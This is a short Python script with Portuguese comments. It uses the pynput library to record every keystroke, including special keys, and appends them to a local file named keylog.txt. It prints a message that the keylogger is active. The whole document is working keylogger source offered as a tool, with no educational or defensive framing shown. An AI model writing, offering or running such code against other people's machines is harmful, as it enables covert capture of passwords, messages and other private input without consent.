import pynput.keyboard
import threading

# Configuração do ficheiro de log
log_file = "keylog.txt"

def process_key_press(key):
    try:
        # Tenta capturar letras e números
        current_key = str(key.char)
    except AttributeError:
        # Captura teclas especiais (Espaço, Enter, etc)
        if str(key) == "Key.space":
            current_key = " "
        elif str(key) == "Key.enter":
            current_key = "\n"
        else:
            current_key = " [" + str(key) + "] "

    write_to_file(current_key)

def  write_to_file(key):
    with open(log_file, "a") as f:
        f.write(key)

# Inicia o Listener do teclado
keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)

with keyboard_listener:
    print("[*] Keylogger ativo... Prime Ctrl+C para parar.")
    keyboard_listener.join()
